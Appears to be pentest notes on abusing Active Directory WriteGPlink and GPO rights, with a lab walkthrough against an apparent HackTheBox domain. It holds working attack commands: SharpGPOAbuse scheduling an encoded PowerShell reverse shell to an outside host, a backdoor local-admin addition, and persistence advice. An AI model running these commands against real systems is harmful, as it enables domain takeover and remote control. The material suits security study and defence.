Link: `https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory`
- Every **OU object** in AD has an attribute called **`gPLink`**, which is basically a list of **Group Policy Objects (GPOs)** linked to it.
- If you have **`WriteGPlink`**, you can **add, remove, or reorder GPO links** on that OU.
### Impact
1. **Linking Malicious GPOs**
    - You can link an existing GPO (that you control) to the OU.
    - Any computers or users in that OU will start applying that GPO automatically.
     Example: You could push a startup script that runs `net localgroup administrators attacker /add` on all machines in that OU.
2. **Privilege Escalation**
    - If the OU contains **privileged users or computers** (like IT staff, servers, or even a Domain Controller if misconfigured), you could gain **Domain Admin** indirectly.
3. **Persistence**
    - You could add a GPO that re-adds your backdoor user to local admins on reboot.
    - Even if defenders try to remove you manually, GPO will reapply.
4. **Indirect Abuse**
    - You don’t even need `Write` access to the GPO itself. Just the ability to **link** an already existing “bad” GPO.
    - Sometimes attackers create a GPO if they also have `CreateGPO` rights, then link it via `WriteGPlink`.
---
### Example Attack Path
Let’s say:
- You compromise a low-privileged service account.    
- That account has `WriteGPlink` on `OU=Workstations`.
- You create (or reuse) a GPO that runs a PowerShell reverse shell on logon.
- You link it to that OU.

Next time a workstation user logs in → your payload executes → creds pop → escalate further.

---
###  So in short:  
`WriteGPlink` = ability to **force policy execution on all users/computers in that OU** → huge attack surface → often leads to privilege escalation.


---

if you have privileges to create or modify GPO's, that would be very valuable thing.
[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) is a project for attacking GPOs with capabilities to modify users, add local admins, set startup scripts, run commands, etc. There’s an already compiled copy of SharpGPOAbuse available from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpGPOAbuse.exe).

`SharpGPOAbuse.exe` requires a “vulnerable” (writable) GPO. There are two GPOs on the domain, so you can enumeratr for GPO or create one if you have privileges to do so:

### List GPO's in AD
```powershell
Get-GPO -all

DisplayName      : Default Domain Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:25:44 AM
UserVersion      : 
ComputerVersion  : 

```


```powershell

# Create GPO
New-GPO -name "0xdf-rev"

# Link GPO
New-GPLink -Name "0xdf-rev" -target "DC=frizz,DC=htb"

# Configure GPO and computer to run compline to it.
SharpGPOAbuse.exe --addcomputertask --GPOName "0xdf-rev" --Author "0xdf" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
# or
.\SharepGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"

# upadte policy
gpupdate /force
```

